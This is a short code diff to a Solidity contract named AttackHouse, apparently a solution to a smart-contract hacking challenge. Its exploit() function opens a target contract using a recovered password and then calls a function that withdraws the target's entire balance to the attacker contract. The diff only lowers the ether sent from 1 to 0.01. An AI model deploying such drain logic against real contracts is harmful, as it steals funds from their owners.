@@ -29,8 +29,8 @@ contract AttackHouse {
     }
 
     function exploit() public payable {
-        require (msg.value == 1 ether);
-        address(originalContract).call.value(1 ether)(abi.encodeWithSignature("openTheHouse(uint256)", findPassword()));
+        require (msg.value == 0.01 ether);
+        address(originalContract).call.value(0.01 ether)(abi.encodeWithSignature("openTheHouse(uint256)", findPassword()));
         address(originalContract).call(abi.encodeWithSignature("youCanWithdrawAllTheBalance(address payable)", payable(address(this))));
     }
 
